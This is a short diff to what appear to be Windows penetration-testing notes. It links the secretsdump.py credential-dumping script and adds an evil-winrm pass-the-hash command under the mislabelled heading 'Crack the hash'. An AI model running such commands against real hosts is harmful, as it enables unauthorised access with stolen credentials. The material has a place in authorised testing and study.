@@ -40,6 +40,9 @@ This documents is for windows
 > [!IMPORTANT]
 > Download the python [file](https://github.com/fin3ss3g0d/secretsdump.py/blob/main/secretsdump.py).
 
+- Crack the hash\
+`evil-winrm -i <IP> -u <USER> -H <HASH>`
+
 
 
 ---
